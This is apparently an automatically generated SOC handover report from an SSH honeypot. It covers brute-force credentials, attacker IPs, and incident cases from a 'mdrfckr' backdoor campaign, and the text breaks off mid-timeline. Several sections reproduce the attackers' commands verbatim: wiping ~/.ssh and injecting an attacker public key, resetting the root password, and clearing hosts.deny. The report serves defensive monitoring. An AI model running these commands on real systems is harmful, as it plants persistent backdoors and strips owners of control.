# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-08 |
| **Generated At** | 2026-04-08T10:54:49Z |
| **Shift Time** | 10:54 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **246** |
| Confirmed Threats | **169** |
| False Positives Filtered | **77** (31.3%) |
| Unique Attacker IPs | **25** |
| Countries of Origin | **12** |
| High Severity Cases | **70** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **176** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **160** |
| Unique Credential Pairs | **76** |
| Unique Usernames | **37** |
| Unique Passwords | **71** |
| Successful Auth Pairs | **47** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 70 |
| `345gs5662d34` | 33 |
| `ubuntu` | 9 |
| `deploy` | 4 |
| `dev` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 33 |
| `3245gs5662d34` | 32 |
| `1` | 4 |
| `test` | 4 |
| `qwerasdf` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 33 |
| `root` | `3245gs5662d34` | 32 |
| `dev` | `1` | 3 |
| `ubuntu` | `qwerasdf` | 3 |
| `root` | `asdasd123123` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `kontol` | `5.181.87.35` | 2026-04-08T08:58:35 |
| `root` | `3245gs5662d34` | `5.181.87.35` | 2026-04-08T08:58:40 |
| `root` | `server12` | `186.219.184.142` | 2026-04-08T08:59:17 |
| `root` | `3245gs5662d34` | `186.219.184.142` | 2026-04-08T08:59:25 |
| `root` | `Sa123456.` | `186.219.184.142` | 2026-04-08T09:01:06 |
| `root` | `asdasd123123` | `34.71.111.34` | 2026-04-08T09:55:26 |
| `root` | `3245gs5662d34` | `34.71.111.34` | 2026-04-08T09:55:32 |
| `root` | `daniel123` | `103.210.21.242` | 2026-04-08T09:57:22 |
| `root` | `3245gs5662d34` | `103.210.21.242` | 2026-04-08T09:57:25 |
| `root` | `Root2020` | `35.237.94.18` | 2026-04-08T09:58:56 |
| `root` | `3245gs5662d34` | `35.237.94.18` | 2026-04-08T09:59:02 |
| `root` | `456` | `120.48.42.17` | 2026-04-08T09:59:11 |
| `root` | `123qwe!` | `20.2.83.149` | 2026-04-08T09:59:38 |
| `root` | `3245gs5662d34` | `20.2.83.149` | 2026-04-08T10:00:06 |
| `root` | `Abcd123!!` | `144.48.243.18` | 2026-04-08T10:00:19 |
| `root` | `3245gs5662d34` | `144.48.243.18` | 2026-04-08T10:00:25 |
| `root` | `daniel123` | `46.8.237.64` | 2026-04-08T10:00:43 |
| `root` | `asdasd123123` | `103.210.21.242` | 2026-04-08T10:01:05 |
| `root` | `Admin2024` | `46.8.237.64` | 2026-04-08T10:01:38 |
| `root` | `!QAZ@WSX1qaz2wsx` | `103.210.21.242` | 2026-04-08T10:04:20 |
| `root` | `ccAA123123` | `103.210.21.242` | 2026-04-08T10:07:38 |
| `root` | `a123456k` | `20.2.83.149` | 2026-04-08T10:07:50 |
| `root` | `ccAA123123` | `46.8.237.64` | 2026-04-08T10:07:51 |
| `root` | `3245gs5662d34` | `46.8.237.64` | 2026-04-08T10:07:55 |
| `root` | `Admin2024` | `103.210.21.242` | 2026-04-08T10:09:13 |
| `root` | `2wsx3edc@#` | `103.210.21.242` | 2026-04-08T10:10:47 |
| `root` | `a123456+` | `112.217.199.222` | 2026-04-08T10:11:01 |
| `root` | `3245gs5662d34` | `112.217.199.222` | 2026-04-08T10:11:04 |
| `root` | `Wm123456` | `20.2.83.149` | 2026-04-08T10:12:14 |
| `root` | `root321..` | `112.217.199.222` | 2026-04-08T10:12:46 |
| `root` | `!QAZ@WSX1qaz2wsx` | `46.8.237.64` | 2026-04-08T10:14:03 |
| `root` | `Admin123456789$` | `46.8.237.64` | 2026-04-08T10:15:07 |
| `root` | `QWERTY2023` | `103.210.21.242` | 2026-04-08T10:15:50 |
| `root` | `a123456789*` | `46.8.237.64` | 2026-04-08T10:16:12 |
| `root` | `asdasd123123` | `46.8.237.64` | 2026-04-08T10:18:17 |
| `root` | `P@ssw0rdwy` | `46.8.237.64` | 2026-04-08T10:19:21 |
| `root` | `qazwsx2019!@#` | `20.2.83.149` | 2026-04-08T10:21:00 |
| `root` | `a123456789*` | `103.210.21.242` | 2026-04-08T10:22:29 |
| `root` | `qwer1111` | `121.237.10.223` | 2026-04-08T10:25:00 |
| `root` | `1234!@#$qwer` | `112.217.199.222` | 2026-04-08T10:26:45 |
| `root` | `passwort` | `112.217.199.222` | 2026-04-08T10:28:28 |
| `root` | `P@ssw0rdwy` | `103.210.21.242` | 2026-04-08T10:29:07 |
| `root` | `Admin123456789$` | `103.210.21.242` | 2026-04-08T10:30:48 |
| `root` | `Ab1234567` | `112.217.199.222` | 2026-04-08T10:39:01 |
| `root` | `qazwsx2019@@` | `112.217.199.222` | 2026-04-08T10:40:41 |
| `root` | `1qaz2wsx3edc!!` | `112.217.199.222` | 2026-04-08T10:44:11 |
| `root` | `ddDD111` | `20.2.83.149` | 2026-04-08T10:47:51 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **246** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 189 |
| Unknown | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 189 | 14 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 189 | 14 | Modern SSH client |
| `95420f9d932d...` | Unknown | 4 | 3 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 3 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 32 | 9 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:TmbxgFAdMLb7"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `121.237.10.223`, `46.8.237.64`, `120.48.42.17`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `112.217.199.222`, `34.71.111.34`, `46.8.237.64`, `144.48.243.18`, `186.219.184.142`, `20.2.83.149`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **25** |
| Unique ASNs | **19** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS51396` | Pfcloud UG | 4 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS56971` | AS56971 Cloud | 1 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |
| `AS262970` | Tudo Internet | 1 | HIGH |
| `AS7552` | Viettel Group | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (69)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3f413a0189e9

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:58 |
| **Last Seen** | 2026-04-08 08:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:58:34` | `cowrie.session.connect` |
| `2026-04-08 08:58:34` | `cowrie.client.version` |
| `2026-04-08 08:58:34` | `cowrie.client.kex` |
| `2026-04-08 08:58:35` | `cowrie.login.success` |
| `2026-04-08 08:58:35` | `cowrie.session.params` |
| `2026-04-08 08:58:35` | `cowrie.command.input` |
| `2026-04-08 08:58:35` | `cowrie.command.failed` |
| `2026-04-08 08:58:36` | `cowrie.log.closed` |
| `2026-04-08 08:58:36` | `cowrie.session.params` |
| `2026-04-08 08:58:36` | `cowrie.command.input` |
| `2026-04-08 08:58:36` | `cowrie.session.file_download` |
| `2026-04-08 08:58:36` | `cowrie.log.closed` |
| `2026-04-08 08:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fba163cf91b

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:58 |
| **Last Seen** | 2026-04-08 08:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:58:39` | `cowrie.session.connect` |
| `2026-04-08 08:58:39` | `cowrie.client.version` |
| `2026-04-08 08:58:39` | `cowrie.client.kex` |
| `2026-04-08 08:58:40` | `cowrie.login.success` |
| `2026-04-08 08:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf2285f94e8f

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-08 08:59 |
| **Last Seen** | 2026-04-08 08:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:59:16` | `cowrie.session.connect` |
| `2026-04-08 08:59:16` | `cowrie.client.version` |
| `2026-04-08 08:59:16` | `cowrie.client.kex` |
| `2026-04-08 08:59:17` | `cowrie.login.success` |
| `2026-04-08 08:59:18` | `cowrie.session.params` |
| `2026-04-08 08:59:18` | `cowrie.command.input` |
| `2026-04-08 08:59:18` | `cowrie.command.failed` |
| `2026-04-08 08:59:19` | `cowrie.log.closed` |
| `2026-04-08 08:59:19` | `cowrie.session.params` |
| `2026-04-08 08:59:19` | `cowrie.command.input` |
| `2026-04-08 08:59:19` | `cowrie.session.file_download` |
| `2026-04-08 08:59:19` | `cowrie.log.closed` |
| `2026-04-08 08:59:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88b4514e02d2

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-08 08:59 |
| **Last Seen** | 2026-04-08 08:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:59:23` | `cowrie.session.connect` |
| `2026-04-08 08:59:23` | `cowrie.client.version` |
| `2026-04-08 08:59:23` | `cowrie.client.kex` |
| `2026-04-08 08:59:25` | `cowrie.login.success` |
| `2026-04-08 08:59:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dd0787fdcdc

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-08 09:01 |
| **Last Seen** | 2026-04-08 09:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 09:01:05` | `cowrie.session.connect` |
| `2026-04-08 09:01:05` | `cowrie.client.version` |
| `2026-04-08 09:01:05` | `cowrie.client.kex` |
| `2026-04-08 09:01:06` | `cowrie.login.success` |
| `2026-04-08 09:01:07` | `cowrie.session.params` |
| `2026-04-08 09:01:07` | `cowrie.command.input` |
| `2026-04-08 09:01:07` | `cowrie.command.failed` |
| `2026-04-08 09:01:07` | `cowrie.log.closed` |
| `2026-04-08 09:01:08` | `cowrie.session.params` |
| `2026-04-08 09:01:08` | `cowrie.command.input` |
| `2026-04-08 09:01:08` | `cowrie.session.file_download` |
| `2026-04-08 09:01:08` | `cowrie.log.closed` |
| `2026-04-08 09:01:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf9cb42d62ac

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-08 09:01 |
| **Last Seen** | 2026-04-08 09:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 09:01:12` | `cowrie.session.connect` |
| `2026-04-08 09:01:12` | `cowrie.client.version` |
| `2026-04-08 09:01:12` | `cowrie.client.kex` |
| `2026-04-08 09:01:14` | `cowrie.login.success` |
| `2026-04-08 09:01:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-381540d3a75d

| Field | Detail |
|---|---|
| **Source IP** | `34.71.111[.]34` |
| **First Seen** | 2026-04-08 09:55 |
| **Last Seen** | 2026-04-08 09:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 09:55:25` | `cowrie.session.connect` |
| `2026-04-08 09:55:25` | `cowrie.client.version` |
| `2026-04-08 09:55:25` | `cowrie.client.kex` |
| `2026-04-08 09:55:26` | `cowrie.login.success` |
| `2026-04-08 09:55:27` | `cowrie.session.params` |
| `2026-04-08 09:55:27` | `cowrie.command.input` |
| `2026-04-08 09:55:27` | `cowrie.command.failed` |
| `2026-04-08 09:55:27` | `cowrie.log.closed` |
| `2026-04-08 09:55:28` | `cowrie.session.params` |
| `2026-04-08 09:55:28` | `cowrie.command.input` |
| `2026-04-08 09:55:28` | `cowrie.session.file_download` |
| `2026-04-08 09:55:28` | `cowrie.log.closed` |
| `2026-04-08 09:55:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.111[.]34` to AbuseIPDB if not already reported
- [ ] Block `34.71.111[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c6c07cd2d3d

| Field | Detail |
|---|---|
| **Source IP** | `34.71.111[.]34` |
| **First Seen** | 2026-04-08 09:55 |
| **Last Seen** | 2026-04-08 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 09:55:31` | `cowrie.session.connect` |
| `2026-04-08 09:55:31` | `cowrie.client.version` |
| `2026-04-08 09:55:31` | `cowrie.client.kex` |
| `2026-04-08 09:55:32` | `cowrie.login.success` |
| `2026-04-08 09:55:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.111[.]34` to AbuseIPDB if not already reported
- [ ] Block `34.71.111[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e81539b359f

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]242` |
| **First Seen** | 2026-04-08 09:57 |
| **Last Seen** | 2026-04-08 09:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 09:57:22` | `cowrie.session.connect` |
| `2026-04-08 09:57:22` | `cowrie.client.version` |
| `2026-04-08 09:57:22` | `cowrie.client.kex` |
| `2026-04-08 09:57:22` | `cowrie.login.success` |
| `2026-04-08 09:57:22` | `cowrie.session.params` |
| `2026-04-08 09:57:22` | `cowrie.command.input` |
| `2026-04-08 09:57:22` | `cowrie.command.failed` |
| `2026-04-08 09:57:23` | `cowrie.log.closed` |
| `2026-04-08 09:57:23` | `cowrie.session.params` |
| `2026-04-08 09:57:23` | `cowrie.command.input` |
| `2026-04-08 09:57:23` | `cowrie.session.file_download` |
| `2026-04-08 09:57:23` | `cowrie.log.closed` |
| `2026-04-08 09:57:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b844dc487ea

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]242` |
| **First Seen** | 2026-04-08 09:57 |
| **Last Seen** | 2026-04-08 09:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 09:57:25` | `cowrie.session.connect` |
| `2026-04-08 09:57:25` | `cowrie.client.version` |
| `2026-04-08 09:57:25` | `cowrie.client.kex` |
| `2026-04-08 09:57:25` | `cowrie.login.success` |
| `2026-04-08 09:57:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa1f1b341081

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-04-08 09:58 |
| **Last Seen** | 2026-04-08 09:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 09:58:55` | `cowrie.session.connect` |
| `2026-04-08 09:58:55` | `cowrie.client.version` |
| `2026-04-08 09:58:55` | `cowrie.client.kex` |
| `2026-04-08 09:58:56` | `cowrie.login.success` |
| `2026-04-08 09:58:56` | `cowrie.session.params` |
| `2026-04-08 09:58:56` | `cowrie.command.input` |
| `2026-04-08 09:58:56` | `cowrie.command.failed` |
